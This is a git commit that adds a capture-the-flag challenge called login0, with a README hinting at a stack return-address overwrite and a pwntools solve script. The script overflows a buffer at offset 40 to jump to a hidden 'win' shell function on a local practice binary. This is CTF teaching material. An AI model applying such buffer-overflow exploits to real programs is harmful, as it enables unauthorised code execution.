a50710547d6fea8ce5b0d3a63a8d52ee32082149
Teddy Heinen <teddy@heinen.dev>
2021-09-16 15:18:43 -0500

    rop w/ win

---
+++ pwn/login0/README.md
@@ -0,0 +1,7 @@
+# login0
+
+Got a flag for you if you know the credentials and don't need it before the end of CTF. I left my secret backdoor shell function in there though, I sure hope no one abuses that. 
+
+### hint
+
+Where do x86_64 Linux programs store the return address in a function?
---
+++ pwn/login0/solve.py
@@ -0,0 +1,34 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("login0")
+
+
+context.binary = exe
+context.terminal = "kitty"
+def conn():
+    if args.REMOTE:
+        return remote("localhost", 7000)
+    elif args.GDB:
+        return gdb.debug(exe.path)
+    else:
+        return process(exe.path)
+
+
+def main():
+    r = conn()
+
+    payload = flat({
+        40: exe.symbols['win'],
+    })
+    r.sendline(payload)
+    r.sendline(b"")
+
+    # good luck pwning :)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
